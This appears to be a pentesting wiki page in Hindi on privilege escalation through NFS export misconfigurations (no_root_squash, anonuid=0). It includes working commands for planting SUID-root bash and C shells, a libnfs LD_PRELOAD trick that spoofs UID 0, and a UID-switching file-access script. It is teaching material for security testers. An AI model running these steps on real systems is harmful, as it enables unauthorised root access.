# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing की मूल जानकारी

NFS AUTH_SYS/AUTH_UNIX के साथ, server हर RPC request में दिए गए `uid` और `gid` के आधार पर file-permission checks करता है। Kerberos जैसे अन्य security flavors अलग credentials का उपयोग करते हैं, और server permissions जाँचने से पहले numeric credentials को map कर सकता है।<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: हर UID और GID को anonymous account पर map करता है, जो Linux पर default रूप से `nobody` (65534) होता है। Non-root requests के लिए `no_all_squash` default है।<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux पर यह default है और UID/GID 0 (root) वाली requests को anonymous account पर map करता है; अन्य UIDs और GIDs को squash नहीं किया जाता।<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Root squashing को disable करता है, इसलिए UID/GID 0 वाली requests को server पर root के रूप में evaluate किया जा सकता है।<sup>[[4]](#references)</sup>

यदि किसी allowed client को **`no_root_squash`** के साथ configured, writable export को **`/etc/exports`** में mount करने की अनुमति है, तो उसकी UID/GID 0 वाली requests वहाँ server के root user के रूप में write कर सकती हैं।<sup>[[4]](#references)</sup>

`root_squash` केवल UID/GID 0 को remap करता है; AUTH_SYS के अंतर्गत, किसी permitted client का **nonzero numeric UID/GID** अब भी server पर किसी दूसरे account से match कर सकता है। इसलिए, root squashing के बावजूद writable export cross-user path बन सकता है, यदि client उस numeric identity के रूप में file बना सकता है और server access की अनुमति देता है। SUID/SGID handoff के लिए resulting file का owner, executable access, server mount की `nosuid` state, ACLs और SELinux या अन्य policy भी verify करें। केवल exported pathname, `rw` option या matching number से यह साबित नहीं होता कि client को अनुमति है, export active है, या दोनों hosts पर effective identity mapping समान है। `/etc/exports` और local metadata को passive तरीके से inspect करें; enumeration के दौरान नया share mount न करें और test file न बनाएँ।<sup>[[4]](#references)[[5]](#references)</sup>

**NFS** के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Root के बराबर anonymous mapping

सिर्फ `no_root_squash` की जाँच न करें। `root_squash,anonuid=0,anongid=0` के साथ, client की UID/GID 0 वाली request squash होकर **वापस root** बन जाती है। `all_squash,anonuid=0,anongid=0` के साथ, non-root client identities भी server पर root में map हो जाती हैं। Writable `sec=sys` export पर, इनमें से कोई भी configuration नीचे दिए गए SUID handoff में इस्तेमाल होने वाला root-owned file primitive उपलब्ध करा सकता है; allowed-client और victim-mount से जुड़ी पाबंदियाँ फिर भी लागू होती हैं।<sup>[[4]](#references)</sup>

Server पर, active export और **matching client** के options inspect करने के लिए `exportfs -v` का उपयोग करें; इनमें `rw`, `sec=`, squash mode और `anonuid`/`anongid` शामिल हैं। Configuration की समीक्षा करते समय `/etc/exports.d/*.exports` भी inspect करें; केवल `/etc/exports` देखने से पूरी जानकारी नहीं मिल सकती।<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Option 1 using bash:
- किसी allowed client पर, root के रूप में writable export mount करें, उसमें **`/bin/bash`** कॉपी करें, उसका **SUID** bit सेट करें, और उसे ऐसे victim mount से execute करें जो `nosuid` का उपयोग नहीं करता।<sup>[[2]](#references)[[4]](#references)</sup>
    - अपलोड की गई फ़ाइल का स्वामित्व root के पास बनाए रखने के लिए, server को **`no_root_squash`** के साथ client UID 0 को संरक्षित करना होगा या **`anonuid=0`** के साथ request को UID 0 पर map करना होगा। अन्यथा, किसी दूसरे account के लिए SUID binary तभी संभव है जब client उस account के numeric UID/GID से उसे बना सके या उसका स्वामी हो सके।<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 compiled C code का उपयोग करके:
- किसी allowed client से directory mount करें, SUID permissions का दुरुपयोग करने वाला compiled payload उसमें copy करें, उसका **SUID** bit set करें, और victim से उसे execute करें (कुछ [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) देखें)।
    - पहले जैसी ही पाबंदियाँ

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> ध्यान दें कि यदि आप अपनी मशीन से victim machine तक **tunnel बना सकते हैं, तो privilege escalation exploit करने के लिए ज़रूरी ports को tunnel करके Remote version का इस्तेमाल अब भी कर सकते हैं**।\
> यह तरकीब तब उपयोगी है जब `/etc/exports` में export को victim के IP तक सीमित किया गया हो: remote client इसे mount नहीं कर सकता, लेकिन local technique पहले से mounted share के ज़रिए काम कर सकती है।<sup>[[2]](#references)</sup>\
> इस unprivileged libnfs method के लिए, **`/etc/exports`** में export पर `insecure` flag होना चाहिए, ताकि process non-reserved source port का इस्तेमाल कर सके; डिफ़ॉल्ट रूप से `secure` लागू होता है, हालाँकि reserved port से bind कर सकने वाली process को इस option की ज़रूरत नहीं होती।<sup>[[1]](#references)[[4]](#references)</sup>

### मूल जानकारी

NFSv3 AUTH_UNIX client हर call में अपना effective UID, GID और groups शामिल करता है, और server permission checks के लिए उनका इस्तेमाल करता है। यह local technique [libnfs](https://github.com/sahlberg/libnfs) के ज़रिए RPC credentials forge करके इस model का दुरुपयोग करती है; इसका preload module NFS context में UID/GID को override करने की सुविधा देता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### लाइब्रेरी को कंपाइल करना

libnfs के example में target kernel के लिए बदलाव करने पड़ सकते हैं; यहाँ इस्तेमाल किए गए walkthrough में preload module compile करने से पहले fallocate syscalls को comment out करने का विशेष उल्लेख है।<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploit को अंजाम देना

यह उदाहरण एक छोटा C helper बनाता है जो shell लॉन्च करता है, फिर उसे share पर रखता है और NFS context में UID 0 के साथ `ld_nfs.so` का उपयोग करके उसे SUID-root बनाता है।<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit code compile करें:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Exploit को share पर रखें और UID spoof करके उसकी permissions modify करें**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **root privileges पाने के लिए exploit को execute करें**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### बोनस: Stealthy File Access के लिए NFShell

Root access मिलने के बाद, यह `nfsh.py` पैटर्न कोई कमांड चलाने से पहले effective UID को target file के UID पर सेट करता है, जिससे ownership को recursively बदले बिना access मिलता है।<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

इस तरह चलाएँ:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [एक कम-ज्ञात NFS privesc की कहानी](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 प्रोटोकॉल विनिर्देश](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
